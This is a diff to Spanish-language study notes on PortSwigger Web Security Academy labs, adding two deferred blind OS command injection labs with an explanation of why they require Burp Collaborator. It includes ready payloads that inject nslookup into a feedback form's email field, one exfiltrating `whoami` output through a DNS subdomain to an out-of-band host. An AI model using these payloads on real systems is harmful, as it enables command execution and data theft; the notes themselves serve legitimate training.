@@ -15,6 +15,35 @@ PortSwigger bloquea por firewall el tráfico saliente desde el navegador del bot
 
 ## Labs aplazados
 
+### OS command injection blind serie out-of-band — aplazados 2026-05-08
+
+Los dos labs comparten la misma limitación de los XXE blind OOB: el endpoint `/feedback/submit` no refleja nada en la respuesta, no hay exploit server provisto, y el firewall del lab bloquea egress a webhook.site/interactsh/requestbin. El canal in-band vía archivos servibles (técnica del lab `lab-blind-output-redirection`) tampoco aplica porque estos labs específicamente validan que Collaborator reciba el callback. Único canal de salida: Collaborator (`*.oastify.com`), que requiere Burp Suite Professional.
+
+Los labs anteriores del cluster (simple case, time-delays, output-redirection) ya están resueltos y documentados.
+
+- **Blind OS command injection with out-of-band interaction**
+  https://portswigger.net/web-security/os-command-injection/lab-blind-out-of-band
+  Razón: `infra-externa-bloqueada-por-firewall + lab cuyo único objetivo es disparar callback DNS OOB`.
+  Vector: parámetro `email` del feedback form (mismo que time-delays/output-redirection). Métrica de éxito: el panel de Collaborator recibe un DNS lookup. No hay datos que extraer, sólo confirmación de que la inyección puede iniciar tráfico saliente arbitrario. Auto-exfiltración same-origin no aplica porque el lab valida el callback en infraestructura del atacante, no en estado del server lab.
+
+  Payload listo para retomar (con Burp Pro):
+  ```
+  email=x$(nslookup+COLLAB-ID.oastify.com)@y.com
+  ```
+  En el body URL-encoded del POST a `/feedback/submit`. Esperar el DNS lookup en el panel de Collaborator. Lab Solved.
+
+- **Blind OS command injection with out-of-band data exfiltration**
+  https://portswigger.net/web-security/os-command-injection/lab-blind-out-of-band-data-exfiltration
+  Razón: misma limitación + exfil real (no solo callback). El lab pide leer `whoami` y enviarlo a Collaborator embebiéndolo en el subdominio del DNS lookup. Verificación lado-atacante: hay que mirar el subdominio recibido en Collaborator y submitear ese username como respuesta.
+
+  Payload listo para retomar (con Burp Pro):
+  ```
+  email=x$(nslookup+`whoami`.COLLAB-ID.oastify.com)@y.com
+  ```
+  El shell evalúa los backticks: `whoami` produce `peter-XXXX`, queda como subdominio del DNS query. Collaborator muestra: `peter-XXXX.COLLAB-ID.oastify.com`. Submitear `peter-XXXX` como solución del lab.
+
+  Nota: combinar `$(...)` y backticks en el mismo payload es necesario porque `$(...)` ya está siendo usado para mantener el formato de email; los backticks son la sustitución anidada para inyectar el output dentro del subdominio. Cuidado con espacios — `nslookup` no admite espacios entre el comando y el host, y dentro de `$(...)` el backtick anida limpio sin necesidad de espacios.
+
 ### Blind SSRF Shellshock exploitation — aplazado 2026-05-06
 
 - **Blind SSRF with Shellshock exploitation**
